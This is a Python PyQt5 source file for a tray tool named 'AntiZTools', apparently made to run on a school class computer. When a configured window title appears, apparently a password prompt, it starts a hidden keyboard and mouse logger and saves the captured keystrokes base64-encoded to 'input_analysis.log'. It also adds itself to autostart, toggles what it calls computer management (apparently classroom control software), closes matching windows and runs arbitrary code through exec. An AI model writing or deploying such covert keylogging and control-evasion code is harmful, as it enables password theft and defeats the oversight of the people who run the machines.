import requests, traceback, sys, random, time, json, os, shutil, tempfile, ctypes, webbrowser, base64
from PyQt5 import QtCore, Qt
from PyQt5.QtGui import QIcon, QFont, QImage, QPixmap
from PyQt5.QtWidgets import QApplication, QFrame, QMessageBox, QLabel, QAction, QMenu, QSystemTrayIcon, QDialog, QMainWindow, QVBoxLayout, QWidget, QGraphicsDropShadowEffect, QPushButton, QGridLayout, QSpacerItem, QSizePolicy
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QSize

from . import config
from .utils.notify import NotificationWindow, WindowNotify
from .utils import reg, path
from .ui.design.Ui_form import Ui_Form
from .ui.DebugForm import DebugForm
from .ui.PasswordDialog import PasswordDialog
from .ui.ZBDialog import ZBDialog
from .ui.AowForm import AowForm

from pynput import keyboard, mouse
import pygetwindow as gw
# import qt_material



def checkNetwork(url="https://example.com"):
    # return True # Debug
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # 如果响应状态码不是200，将抛出HTTPError异常
        return False
    except Exception as e:
        print(e)
    return True



class MyQAction(QAction):
    baseText = False
    def changeText(self, text):
        if not self.baseText: self.baseText = self.text();
        self.setText(self.baseText + text)


class MyMainWindow(QMainWindow, Ui_Form):
    getGWThreadStatus = False
    ssTimerFlag = False
    keyboardThreadStatus = False

    def __init__(self,parent =None):
        super(MyMainWindow,self).__init__(parent)
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())
        self.qIcon = QIcon(path.path("icon.jpg"))
        self.setWindowIcon(self.qIcon)
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.setWindowTitle("AntiZTools | Made for Class 6.")
    
    def _initTray(self):
        self.stOnStAction = MyQAction("开机自启：", self)
        self.winTitleAction = MyQAction("窗口标题：", self)
        self.conStatusAction = MyQAction("计算机管理：", self)
        self.openAction = QAction("打开主界面", self)
        self.exitAction = QAction("退出程序", self)
        self.aowAction = QAction("窗口的艺术", self)
        self.trayIconMenu = QMenu(self)
        self.trayIconMenu.addActions((self.stOnStAction, self.winTitleAction, self.conStatusAction))
        self.trayIconMenu.addSeparator()
        self.trayIconMenu.addAction(self.aowAction)
        self.trayIconMenu.addSeparator()
        self.trayIconMenu.addActions((self.openAction, self.exitAction))
        self.openAction.triggered.connect(self.openPwdDialog(myWin.show))
        self.exitAction.triggered.connect(self.openPwdDialog(app.quit))
        self.aowAction.triggered.connect(self.openAowDialog)
        self.winTitleAction.changeText("未运行")
        self.trayIcon = QSystemTrayIcon(self)
        self.trayIcon.setContextMenu(self.trayIconMenu)
        self.trayIcon.setIcon(self.qIcon)
        self.trayIcon.setToolTip(config.get("Tray.ToolTip"))
        self.trayIcon.show()
    
    def changeTrayIcon(self, icon):
        self.trayIcon.setIcon(QIcon(icon))
    
    def init(self):
        try:
            self._init()
        except Exception as e:
            print(traceback.format_exc())
            QMessageBox.warning(self, "发生错误", "运行发生错误，请将下列错误信息提交给开发者：\n{}".format(str(e)))

    def _init(self):
        self._initTray()
        self.desktop = QApplication.desktop()

        self.autoStartThread = AutoStartThread()
        self.autoStartThread.messager.connect(self.showMessage)
        self.autoStartThread.start()
        
        self.clearLogsBtn.clicked.connect(self.clearLogs)
        self.titleBtn.clicked.connect(self.runGWThread)
        self.stopGetGWThread.clicked.connect(self.stopGWThread)
        self.enableAutoStart.clicked.connect(self.setAutoStart)
        self.AutoStartTipLabel.setText(path.cwdPath(config.get("Config.EXEFileName")))

        self.execCode.clicked.connect(self.execCodeFunc)
        self.execCode_2.clicked.connect(self.execCodeThreadFunc)
        self.debugHelpBtn.clicked.connect(self.debugHelp)

        self.disableController.clicked.connect(self.disableControllerFunc)
        self.enableController.clicked.connect(self.enableControllerFunc)

        self.openDebugForm.clicked.connect(self.openDebugFormFunc)
        
        self.resetCfg()
        self.saveCfgBtn.clicked.connect(self.saveCfg)
        self.reCfgBtn.clicked.connect(self.resetCfg)
        self.acCfgBtn.clicked.connect(self.acCfg)

        self.reFileBtn.clicked.connect(self.loadFileContent)
        self.saveFileBtn.clicked.connect(self.saveFileContent)

        self.getWindowThread = GetWindowThread(self.desktop.width(), self.desktop.height())
        self.getWindowThread.execer.connect(self.execInnerFunc)
        self.getWindowThread.logger.connect(self.log)
        self.getWindowThread.stopThread.connect(self.stopGWThread)
        self.runGWThread()

        self.keyboardThread = KeyBoardThread()

        self.log("<p style='color:green;'>Init Success!</p>")

        if int(config.get("ScreenSaver.StartScreenSaverTimer")) != 0:
            self.ssTimer = QTimer()
            self.ssTimer.timeout.connect(self.startScreenSaver)
            self.ssTimer.start(int(config.get("ScreenSaver.StartScreenSaverTimer"))*1000)
        if config.get("Config.StartShow"):
            self.log("<i>Show on starting.</i>")
            myWin.show()
        if config.get("Tray.StartMsg") != "":
            self.log("<i>Show Tray Message.</i>")
            self.showMessage(config.get("Tray.StartMsg"))
        if config.get("News.Enable"):
            self.getNewsThread = GetNewsThread()
            self.getNewsThread.execer.connect(self.execInnerFunc)
            self.getNewsThread.logger.connect(self.log)
            self.getNewsThread.start()

    def loadFileContent(self):
        _path: str = self.filepathInput.text()
        self.log(f"Load file in {_path}")
        content: str = ""
        if not os.path.exists(path.path(_path)):
            self.log("<b style='color:red;'>File not found!</b>")
            self.viewFileTextarea.setText("<b style='color:red;'>File not found!</b>")
            return
        with open(path.path(_path), "r", encoding="utf-8") as f:
            content = f.read()
        try:
            content = base64.b64decode(content).decode("utf-8")
        except Exception:
            self.log("Cannot b64decode file content!")
        self.viewFileTextarea.setText(content)

    def saveFileContent(self):
        _path: str = self.filepathInput.text()
        self.log(f"Load file in {_path}")
        if not os.path.exists(path.path(_path)):
            self.log("<b style='color:red;'>File not found!</b>")
            self.viewFileTextarea.setText("<b style='color:red;'>File not found!</b>")
            return
        content: str = self.viewFileTextarea.toPlainText()
        flag = True
        with open(path.path(_path), "w", encoding="utf-8") as f:
            try:
                f.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
            except Exception as e:
                flag = False
                QMessageBox.warning(self, "保存失败", str(e))
        if flag:
            QMessageBox.information(self, "保存成功", "保存成功！")

    def NotifyWindow(self, title, content, banner=False, detail=None, timeout=1000*60*3):
        def viewCallback(_):
            print(detail)
            if detail:
                webbrowser.open(detail)
        img = False
        if banner:
            res = requests.get(banner)
            img = QImage.fromData(res.content)
        WindowNotify(app, f"{config.get('Tray.ToolTip')}每日资讯", title, content, img, timeout=timeout, viewCallback=viewCallback, parent=self).show().showAnimation()

    def openAowDialog(self):
        self.aowForm = AowForm(self.desktop.width(), self.desktop.height())
        self.aowForm.show()

    def openDebugFormFunc(self):
        if self.getGWThreadStatus:
            tt = self.debugFormTitle.text()
            tt = tt if tt else "debugForm"
            self.debugForm = DebugForm(tt, self.desktop.width(), self.desktop.height())
            self.debugForm.closeBtn.clicked.connect(self.closeDebugForm)
            self.getWindowThread.debugFormStatus = True
            self.debugForm.show()
        else:
            QMessageBox.warning(self, "调试窗口", "请先启动getGW线程")

    def setDebugForm(self, title):
        if self.debugForm:
            self.debugForm.setTitleText(title)

    def closeDebugForm(self):
        if self.getGWThreadStatus:
            self.getWindowThread.debugFormStatus = False
        self.debugForm.close()

    def startScreenSaver(self):
        try:
            lit = self.getLastInputTime()
            self.log("LastInputTime:", lit)
            if lit >= int(config.get("ScreenSaver.StartScreenSaverLastTime")):
                if not self.ssTimerFlag:
                    self.ssTimerFlag = True
                    self.log("<p style='color:green;'>Starting ScreenSaver</p>")
                    os.system(config.get("ScreenSaver.ScreenSaverCmd"))
            else:
                self.ssTimerFlag = False
        except Exception as e:
            self.log("<p style='color:red;'>StartingScreenTimerException:", str(e), "</p>")
            self.log("<i>Stopping StartingScreenTimer</i>")
            self.ssTimer.stop()

    def getLastInputTime(self):
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        user32.GetLastInputInfo(ctypes.byref(lii))
        millis = kernel32.GetTickCount() - lii.dwTime
        seconds = millis / 1000
        return seconds
    
    def showMessage(self, msg, *args, **kwargs):
        try:
            self.trayIcon.showMessage(config.get("Tray.ToolTip"), msg, self.qIcon, *args, **kwargs)
        except Exception:
            pass

    def saveCfg(self):
        cfg_str = self.CfgTextarea.toPlainText()
        try:
            config.data = json.loads(cfg_str)
            config.save()
            QMessageBox.information(self, "保存成功", "保存成功！\n有些功能重启程序后生效")
        except Exception as e:
            QMessageBox.warning(self, "保存失败", "保存失败！\n{}".format(str(e)))
    
    def resetCfg(self):
        self.CfgTextarea.setText(json.dumps(config.data, ensure_ascii=False, indent=4))
    
    def acCfg(self):
        config.autoComplete()
        self.resetCfg()
    
    def debugHelp(self):
        QMessageBox.information(self, "调试指南", """
        主线程执行：在MainWindow中执行代码\n
        子线程执行：在RunCodeThread中执行代码\n
        在主线程中，调用self.log(*args)来输出调试信息到日志框\n
        在子线程中，调用self.logger.emit(str)来输出调试信息到日志框\n
        在子线程中，调用self.execer.emit(str, (args,))来执行主线程名为str的方法，并附带参数*(args,)
        """)

    def execCodeFunc(self):
        try:
            exec(self.DebugCode.toPlainText())
        except Exception as e:
            self.log(str(e))
    
    def execCodeThreadFunc(self):
        runCodeThread = RunCodeThread(self.DebugCode.toPlainText())
        runCodeThread.logger.connect(self.log)
        runCodeThread.execer.connect(self.execInnerFunc)
        runCodeThread.start()
    
    def execInnerFunc(self, func, args):
        try:
            getattr(self, func)(*args)
        except Exception as e:
            self.log(str(e))
    
    def notifySuccess(self, title, msg):
        NotificationWindow.success(app, title, msg)
    
    def notifyError(self, title, msg):
        NotificationWindow.error(app, title, msg)

    def notifyInfo(self, title, msg):
        NotificationWindow.info(app, title, msg)
    
    def notifyWarning(self, title, msg):
        NotificationWindow.warning(app, title, msg)

    def openPwdDialog(self, func):
        def _openPwdDialog():
            PasswordDialog(func).exec_()
        return _openPwdDialog

    def runGWThread(self):
        if config.get("WindowTitle.Enable") and self.getGWThreadStatus == False:
            self.getWindowThread.exitFlag = False
            self.getWindowThread.start()
            self.getGWThreadStatus = True
            self.getgwstatus.setText("正在运行")
            self.getgwstatus.setStyleSheet("color: green;")
            self.winTitleAction.changeText("正在运行")

    def stopGWThread(self):
        try:
            self.getWindowThread.forceStop()
            self.getWindowThread.quit()
            self.getGWThreadStatus = False
            self.getgwstatus.setText("未运行")
            self.winTitleAction.changeText("未运行")
            self.getgwstatus.setStyleSheet("color: red;")
        except Exception:
            pass
    
    def runKeyBoardThread(self, fileName):
        if self.keyboardThreadStatus == False:
            self.keyboardThreadStatus = True
            self.keyboardThread.fileName = fileName
            self.keyboardThread.start()
    
    def stopKeyBoardThread(self):
        try:
            self.keyboardThread.forceStop()
            self.keyboardThread.quit()
            self.keyboardThreadStatus = False
        except Exception:
            pass
    
    def enableControllerFunc(self):
        controllerStatus = reg.ControllerStatus()
        if controllerStatus.status():
            controllerStatus.enable()
        if not controllerStatus.status():
            self.controllerStatus.setText("未禁用")
            self.conStatusAction.changeText("未禁用")
            self.controllerStatus.setStyleSheet("color: green")
            self.enableController.setDisabled(True)
            self.disableController.setDisabled(False)

    def disableControllerFunc(self):
        controllerStatus = reg.ControllerStatus()
        if not controllerStatus.status():
            controllerStatus.disable()
        if controllerStatus.status():
            self.controllerStatus.setText("已禁用")
            self.conStatusAction.changeText("已禁用")
            self.controllerStatus.setStyleSheet("color: red")
            self.disableController.setDisabled(True)
            self.enableController.setDisabled(False)

    def setAutoStart(self):
        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
        if not autoStarter.is_auto_start():
            autoStarter.set_auto_start()
        if autoStarter.is_auto_start():
            self.AutoStartLabel.setText("已启用")
            self.stOnStAction.changeText("已启用")
            self.AutoStartLabel.setStyleSheet("color: green")
            self.enableAutoStart.setDisabled(True)
    
    def openZBDialog(self, msg, w, h):
        zbDialog = ZBDialog(msg)
        # zbDialog.label.adjustSize()
        zbDialog.move(random.randint(0, w - zbDialog.width()), random.randint(0, h - zbDialog.height()))
        zbDialog.exec_()

    def clearLogs(self):
        self.logTextarea.clear()
    
    def log(self, *args):
        logStr = ""
        for i in args:
            logStr += str(i) + " "
        self.logTextarea.append(logStr)



class AutoStartThread(QThread):
    messager = pyqtSignal(str)

    def __init__(self):
        super(AutoStartThread, self).__init__()

    def __del__(self):
        self.wait()

    def run(self):
        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
        if autoStarter.is_auto_start():
            myWin.AutoStartLabel.setText("已启用")
            myWin.AutoStartLabel.setStyleSheet("color: green")
            myWin.enableAutoStart.setDisabled(True)
            myWin.stOnStAction.changeText("已启用")
        else:
            myWin.AutoStartLabel.setText("未启用")
            myWin.AutoStartLabel.setStyleSheet("color: red")
            myWin.stOnStAction.changeText("未启用")
        
        controllerStatus = reg.ControllerStatus()
        if controllerStatus.status():
            myWin.controllerStatus.setText("已禁用")
            myWin.controllerStatus.setStyleSheet("color: red")
            myWin.disableController.setDisabled(True)
            myWin.conStatusAction.changeText("已禁用")
        else:
            myWin.controllerStatus.setText("未禁用")
            myWin.controllerStatus.setStyleSheet("color: green")
            myWin.enableController.setDisabled(True)
            myWin.conStatusAction.changeText("未禁用")
        
        temp_dir = tempfile.gettempdir()
        failedtimes, successtimes, cleantipstr = 0, 0, ""
        for item in os.listdir(temp_dir):
            if item.startswith(config.get("TempFileClear.TempFilePrefix")):
                try:
                    print("Delete Temp:", item)
                    shutil.rmtree(os.path.join(temp_dir, item))
                    successtimes += 1
                except Exception as e:
                    failedtimes += 1
                    print(e)
        if failedtimes >= int(config.get("TempFileClear.CleanFailedTimes")):
            cleantipstr = "。\n失败数量过多，请引起注意！"
        self.messager.emit(f"临时文件清理完毕，成功{successtimes}个，失败{failedtimes}个{cleantipstr}")

class KeyBoardThread(QThread):
    enterFlag = False

    def __init__(self):
        super(KeyBoardThread, self).__init__()
        self.logContent = ""
    
    def forceStop(self):
        try:
            try:
                content = ""
                if os.path.exists(path.path(self.fileName)):
                    with open(path.path(self.fileName), "r", encoding="utf-8") as f1:
                        content += base64.b64decode(f1.read()).decode("utf-8")
                content += self.logContent
                with open(path.path(self.fileName), "w", encoding="utf-8") as f2:
                    f2.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
                self.logContent = ""
            except Exception as e:
                print(e)
            self.keyboardListener.stop()
            self.mouseListener.stop()
        except Exception:
            del self.keyboardListener
            del self.mouseListener
    
    def on_press(self, key):
        try:
            char = key.char
            if char:
                print(f"{char} Pressed.")
                self.logContent += char
        except AttributeError:
            print(f"{key} Pressed.")
            self.logContent += f"[{str(key).replace('Key.', '')}]"
        if not self.enterFlag:
            self.enterFlag = True
    
    def on_mouse(self, x, y, dx=None, dy=None):
        print("Mouse move", x, y, dx, dy)
        if self.enterFlag:
            self.logContent += "\n"
            self.enterFlag = False

    def run(self):
        now = time.localtime()
        time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
        self.logContent += f"\n\n({time_str}):\n"

        self.mouseListener = mouse.Listener(
            on_move=self.on_mouse,
            on_click=self.on_mouse,
            on_scroll=self.on_mouse)
        self.mouseListener.start()

        self.keyboardListener = keyboard.Listener(
                on_press=self.on_press)
        self.keyboardListener.start()
        self.keyboardListener.join()
        try:
            self.keyboardListener.stop()
            self.mouseListener.stop()
        except Exception:
            pass

class GetNewsThread(QThread):
    execer = pyqtSignal(str, tuple)
    logger = pyqtSignal(str)

    def __init__(self):
        super(GetNewsThread, self).__init__()
    
    def run(self):
        try:
            self.news = requests.get(config.get("News.NewsApi")).json()
            print(self.news)
            for i in self.news:
                self.execer.emit("NotifyWindow", (i.get("title"), i.get("content"), i.get("banner", False), i.get("detail", None)))
        except Exception:
            self.logger.emit(f"<p style='color:red;'>Cannot get News from '{config.get('News.NewsApi')}'!</p>")


class GetWindowThread(QThread):
    exitFlag = False
    execer = pyqtSignal(str, tuple)
    logger = pyqtSignal(str)
    stopThread = pyqtSignal()
    ZBDialogFlag = True
    PasswordFlag = False
    debugFormStatus = False

    def __init__(self, width, height):
        super(GetWindowThread, self).__init__()
        self.width = width
        self.height = height
        self.hooks = config.get("WindowTitle.hook")
    
    def forceStop(self):
        self.exitFlag = True
    
    def run(self):
        if checkNetwork(url=config.get("Config.CheckUrl")):
            # 状态异常
            self.ZBDialogFlag = False
            self.execer.emit("changeTrayIcon", (path.path("icon_colored.png"),))
            self.logger.emit("Started ZBDialog Listener.")
        
        # debug
        # self.ZBDialogFlag = False

        _oldTitle = None
        while True:
            try:
                if self.exitFlag:
                    break
                window = gw.getActiveWindow()
                if window == None:
                    time.sleep(int(config.get("WindowTitle.Interval")))
                    continue
                title = window.title
                matchFlag = False
                isNewWindow = False
                if _oldTitle != title and self.debugFormStatus:
                    self.execer.emit("setDebugForm", (title,))
                    isNewWindow = True
                    _oldTitle = title
                for i in self.hooks:
                    if not i.get("enable", True):
                        continue
                    if (i.get("title") == title) or (i.get("fuzzyMatching") and i.get("title") in title):
                        matchFlag = True
                        if i.get("handler") == "ZBDialog":
                            if not self.ZBDialogFlag:
                                self.logger.emit("Stopped ZBDialog Listener.")
                                self.openZBDialog(i.get("data", {}))
                                self.execer.emit("changeTrayIcon", (path.path("icon.jpg"),))
                                if i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到装逼", "已自动打开装逼窗口",))
                                self.ZBDialogFlag = True
                        elif i.get("handler") == "keyboardListener":
                            if not self.PasswordFlag:
                                self.PasswordFlag = True
                                # Start catch keyboard input thread
                                self.execer.emit("runKeyBoardThread", (i.get("data", {}).get("fileName", "input_analysis.log"),))
                                self.logger.emit("Started KeyBoard Listener.")
                        elif i.get("handler") == "closeWindow":
                            if isNewWindow and window != None:
                                window.close()
                                self.logger.emit("Closed Window: " + title)
                                msg = i.get("data", {}).get("msg", "已自动关闭不良界面")
                                if msg and not i.get("data", {}).get("notify", False):
                                    self.execer.emit("showMessage", (msg,))
                                elif msg and i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到不良界面", msg,))
                if not matchFlag:
                    if self.PasswordFlag:
                        self.PasswordFlag = False
                        # Stop catch keyboard input thread
                        self.execer.emit("stopKeyBoardThread", ())
                        self.logger.emit("Stopped KeyBoard Listener.")
            except Exception as e:
                self.logger.emit(str(e))
            time.sleep(int(config.get("WindowTitle.Interval")))
        self.stopThread.emit()
        self.debugFormStatus = False
    
    def openZBDialog(self, i):
        for _ in range(i.get("times", 5)):
            self.execer.emit(
                "openZBDialog",
                (
                    random.choice(i.get("msg", ["检测到有人在装逼，我不说是谁", "震惊，六班竟然突破了科技封锁", "原神哥真的是太有实力啦"])),
                    self.width,
                    self.height,
                )
            )
            time.sleep(0.4)

class RunCodeThread(QThread):
    logger = pyqtSignal(str)
    execer = pyqtSignal(str, tuple)

    def __init__(self, code):
        super(RunCodeThread, self).__init__()
        self.code = str(code)
    
    def __del__(self):
        self.wait()
    
    def run(self):
        try:
            exec(self.code)
        except Exception as e:
            self.logger.emit(str(e))

QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling)
app = QApplication(sys.argv)
# setup stylesheet
# qt_material.apply_stylesheet(app, theme='dark_teal.xml')
QApplication.setFont(QFont(config.get("Config.FontFamily"), int(config.get("Config.FontPointSize"))))
QApplication.setQuitOnLastWindowClosed(False)
myWin = MyMainWindow()

def run():
    # init widget
    myWin.init()
    sys.exit(app.exec_())

if __name__ == "__main__":
    run()
